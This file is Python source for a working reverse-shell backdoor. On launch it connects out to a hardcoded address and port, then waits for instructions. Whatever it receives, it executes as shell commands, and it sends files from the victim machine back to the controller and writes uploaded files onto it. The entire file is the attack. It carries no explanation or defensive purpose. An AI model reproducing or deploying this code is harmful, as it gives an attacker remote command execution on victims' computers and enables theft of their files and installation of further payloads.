import socket
import subprocess
import json
import os
import base64


class Backdoor:

    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def realible_send(self, data):
        json_data = json.dumps(data)
        self.connection.sendall(json_data.encode('utf-8'))

    def realible_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)

            except ValueError:
                continue

    def execute_cmd(self, cmd):
        return subprocess.check_output(cmd, shell=True)

    def change_directory(self, path):
        os.chdir(path)
        return ""

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."

    def read_file(self, path):
       with open(path, 'rb') as file:
           return base64.b64encode(file.read())

    def run(self):
        while True:
            command = self.realible_receive()

            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
            
                elif command[0] == "cd" and len(command) > 1:
                    cmd_result = self.change_directory(command[1])

                elif command[0] == "download":
                    cmd_result = self.read_file(command[1])

                elif command[0] == "upload":
                    cmd_result = self.write_file(command[1], command[2])

                else:
                    cmd_result = self.execute_cmd(command)
 
            except Exception:
                cmd_result = "[-] Error during command execution."

            try:
                self.realible_send(cmd_result.decode('utf-8'))
            except AttributeError:
                self.realible_send(cmd_result)


my_backdoor = Backdoor("192.168.1.100", 8080)
my_backdoor.run()
